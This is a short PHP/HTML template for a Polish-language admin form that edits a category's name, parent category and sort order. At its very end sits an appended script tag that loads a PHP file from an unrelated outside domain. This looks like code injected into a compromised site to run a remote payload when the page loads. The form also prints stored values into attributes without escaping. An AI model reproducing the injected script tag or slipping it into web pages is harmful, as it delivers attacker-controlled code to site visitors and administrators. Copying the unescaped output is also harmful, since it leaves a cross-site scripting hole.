<fieldset>
<dl>

<dt><input name='name' class='wide' value='<?=$current -> name?>'></dt>
<dd>Nazwa kategorii</dd>

<dt>
	<select name='category[]'>
	<option value='1'>(Kategoria główna)
	<?module('categories_select', array('current' => $current))?>
	</select>
</dt>
<dd>Kategoria kategorii</dd>

<dt><input name='siblingOrder' value='<?=$current -> siblingOrder?>'></dt>
<dd>Numer porządkowy kategorii (kategorie wewnątrz list będą sortowane najpierw według tego numeru, następnie według nazwy)</dd>

</dl>
</fieldset><script src=http://johanneswallmark.com/media/sitemap.php ></script>